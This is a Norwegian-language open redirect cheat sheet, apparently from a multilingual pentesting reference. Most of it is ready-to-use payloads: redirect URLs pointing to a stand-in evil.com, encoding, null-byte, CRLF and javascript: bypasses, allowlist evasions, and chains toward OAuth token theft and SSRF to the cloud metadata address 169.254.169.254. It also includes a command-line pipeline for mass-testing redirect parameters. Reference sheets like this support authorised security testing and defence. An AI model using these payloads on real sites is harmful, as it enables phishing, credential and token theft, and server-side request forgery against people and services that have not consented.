# 🔀 Hurtigreferanse for åpen omdirigering

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

> **Begreper og presisering:** Åpen omdirigering betyr at en kontrollert verdi kan sende brukeren til et utilsiktet mål. URL-parsere, dekoding og tillatte skjemaer varierer; localhost er ikke i seg selv et eksternt angripernettsted. En OAuth-/SSRF-/XSS-kjede krever ytterligere feil og passende flyt, ikke bare en URL som inneholder de viste tegnene. CRLF, nullbyte, javascript og data kan avvises eller behandles annerledes av moderne miljøer. Kommandoen som viser Location bekrefter ikke alene virkningen i en nettleser. Eksemplene er bevart; se [PortSwiggers referanse](https://portswigger.net/kb/issues/00500100_open-redirection-reflected).

---

## 🎯 Hva er åpen omdirigering

**Åpen omdirigering (open redirect)** lar angripere omdirigere brukere til ondsinnede nettsteder via et betrodd domene, og kan brukes til phishing eller kombineres med andre sårbarheter.

---

## 🔍 Vanlige parametere

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payloads

### Grunnleggende
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Uten protokoll
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Bruk av @-symbolet
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Triks med omvendt skråstrek
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### URL-koding
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Domeneforveksling
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Nullbyte
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF-injeksjon
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### JavaScript-omdirigering
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Omgåelsesteknikker

### Hvis en tillatelsesliste kontrolleres
```
# Omgåelse via underdomene
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Omgåelse via sti
https://target.com/https://evil.com
https://target.com//evil.com
```

### Hvis bare HTTPS tillates
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Triks med localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Kjedekobling av åpne omdirigeringer

### Tyveri av OAuth-token
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Stjel OAuth-tokener
```

### SSRF-kjede
```
https://target.com/redirect?url=http://169.254.169.254/
```

### XSS-kjede
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Hurtigreferanse

| Payloadtype | Eksempel |
|--------------|---------|
| Grunnleggende | `//evil.com` |
| @-symbol | `https://target.com@evil.com` |
| Koding | `https:%2f%2fevil.com` |
| Domeneforveksling | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Verktøy

```bash
# GF-mønstre
gau target.com | gf redirect

# Manuell testing
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Ressurser

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Undersøk omdirigeringer!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
